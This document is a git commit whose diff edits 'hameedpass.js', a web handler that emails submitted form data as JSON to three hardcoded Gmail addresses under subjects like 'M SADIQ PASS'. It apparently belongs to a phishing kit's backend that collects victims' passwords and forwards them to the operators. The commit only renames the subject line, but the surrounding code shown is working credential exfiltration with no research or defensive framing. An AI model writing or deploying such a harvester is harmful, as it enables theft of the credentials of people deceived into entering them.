b7b103917b4cf4559a9e507d06a984b489126ff7
nxnxcmmc-sys <nxnxcmmc@gmail.com>
2025-12-15 13:37:42 +0500

    Update hameedpass.js

--- hameedpass.js
+++ hameedpass.js
@@ -38,7 +38,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
       to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,businessmata58@gmail.com",
-      subject: "RAOUF PASS",
+      subject: " M SADIQ PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
